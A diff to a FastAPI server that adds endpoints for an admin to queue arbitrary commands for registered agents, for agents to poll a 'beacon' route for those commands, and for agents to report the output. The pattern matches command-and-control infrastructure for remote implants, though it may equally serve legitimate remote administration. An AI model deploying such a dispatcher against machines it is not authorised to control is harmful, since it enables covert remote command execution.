@@ -1,8 +1,8 @@
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Depends
 from database import engine, Base
 from schemas import *
 from crud import *
-from auth import create_token
+from auth import *
 from config import settings
 
 app = FastAPI()
@@ -33,3 +33,21 @@ async def login_agent(agent: AgentRegister):
         raise HTTPException(status_code=401, detail="Invalid credentials")
     token = create_token({"sub": auth.agent_id, "role": "agent"})
     return {"access_token": token, "token_type": "bearer"}
+
+@app.post("/task", dependencies=[Depends(get_current_admin)])
+async def send_task(data: TaskCreate):
+    task = await queue_task(data.agent_id, data.command)
+    return {"status": "queued", "task_id": task.id}
+
+@app.post("/agent/beacon", response_model=TaskResponse, dependencies=[Depends(get_current_agent)])
+async def agent_beacon(data: BeaconRequest):
+    task = await fetch_pending_task(data.agent_id)
+    if task:
+        return TaskResponse(task_id=task.id, command=task.command)
+    return TaskResponse()
+
+@app.post("/agent/result", dependencies=[Depends(get_current_agent)])
+async def submit_result(data: ResultSubmit):
+    await store_result(data.agent_id, data.task_id, data.output)
+    await mark_task_complete(data.task_id)
+    return {"status": "result received"}
